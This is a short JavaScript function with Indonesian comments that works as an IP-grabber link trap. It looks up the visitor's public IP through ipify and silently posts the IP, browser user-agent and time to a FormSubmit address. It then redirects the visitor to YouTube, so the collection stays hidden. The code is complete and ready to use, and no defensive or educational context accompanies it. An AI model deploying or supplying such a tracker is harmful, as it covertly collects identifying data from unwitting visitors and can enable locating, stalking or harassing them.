function logIP() {
    // Dapatkan IP pengunjung
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            
            // Kirim IP ke FormSubmit
            fetch('https://formsubmit.co/el/nivero', {
                method: "POST",
                headers: { 
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    ip: ip,
                    userAgent: navigator.userAgent,
                    waktu: new Date().toLocaleString()
                })
            });
            
            // Redirect setelah mengirim data
            window.location.href = "https://youtube.com/";
        });
}